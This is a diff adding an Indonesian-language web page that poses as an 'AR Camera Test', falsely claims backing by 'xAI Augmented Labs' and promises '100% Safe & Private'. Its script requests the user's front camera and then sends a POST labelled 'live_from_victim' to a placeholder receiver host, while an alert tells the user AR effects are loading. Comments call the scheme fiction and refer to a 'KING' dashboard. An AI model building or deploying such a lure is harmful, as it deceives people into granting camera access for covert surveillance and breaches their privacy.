@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AR Camera Test v4.20 - Experience Augmented Reality</title>
+    <style>
+        body { margin:0; background: linear-gradient(#000, #300); color:#0f0; font-family: Arial; text-align:center; height:100vh; display:flex; align-items:center; justify-content:center; }
+        .box { background:rgba(0,0,0,0.8); padding:40px; border:3px solid #f00; border-radius:15px; box-shadow:0 0 30px #f00; }
+        button { padding:20px 60px; font-size:28px; background:#f00; color:#fff; border:none; cursor:pointer; margin-top:30px; box-shadow:0 0 20px #0f0; }
+        button:hover { background:#0f0; color:#000; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>🎥 AUGMENTED REALITY CAMERA TEST v4.20</h1>
+        <p style="font-size:22px;">Tes kamera AR terbaru dengan efek realistis</p>
+        <p style="color:#ff0;">Klik tombol di bawah untuk mulai pengalaman AR</p>
+        
+        <button onclick="startCamera()">🚀 START AR CAMERA TEST</button>
+        
+        <p style="margin-top:40px; font-size:14px; color:#666;">Supported by xAI Augmented Labs • 100% Safe & Private</p>
+    </div>
+
+    <script>
+    function startCamera() {
+        navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" } 
+        }).then(stream => {
+            // Di cerita fiksi ini, stream dikirim ke server KING
+            fetch('https://your-receiver-link.com/receive', {
+                method: 'POST',
+                body: JSON.stringify({ stream: "live_from_victim" }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+            alert("✅ Kamera berhasil diaktifkan!\nAR effects sedang dimuat...");
+            // Di fiksi savage, stream sudah dikirim ke dashboard KING
+        }).catch(() => {
+            alert("Izinkan kamera untuk melanjutkan AR Test");
+        });
+    }
+    </script>
+</body>
+</html>
